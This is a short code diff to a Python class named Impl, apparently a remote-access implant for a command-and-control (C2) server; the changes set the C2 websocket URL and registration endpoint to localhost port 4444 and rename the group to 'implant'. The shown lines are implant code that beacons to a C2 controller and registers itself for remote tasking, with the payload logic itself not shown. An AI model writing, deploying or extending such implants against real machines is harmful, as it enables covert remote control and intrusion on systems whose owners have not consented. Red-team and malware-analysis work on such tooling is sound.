@@ -19,7 +19,7 @@ import requests
 
 
 class Impl:
-    def __init__(self, c2_ws_url: str, group: str = "fdgfdgdf"):
+    def __init__(self, c2_ws_url: str, group: str = "implant"):
         self.c2_ws_url = c2_ws_url
         self.group = group
         self.current_dir = os.getcwd()
@@ -508,7 +508,7 @@ class Impl:
         }
  
         
-        req = requests.post(f"http://localhost:333/api/impl/new/{model['impl_id']}", data=model)
+        req = requests.post(f"http://localhost:4444/api/impl/new/{model['impl_id']}", data=model)
         
 
     @property
@@ -553,8 +553,8 @@ class Impl:
 if __name__ == "__main__":
     try:
         
-        C2_WS_URL = "ws://localhost:333/api/rcv"
-        GROUP_NAME = "fdgfdgdf"
+        C2_WS_URL = "ws://localhost:4444/api/rcv"
+        GROUP_NAME = "implant"
         
         impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
         asyncio.run(impl.run())
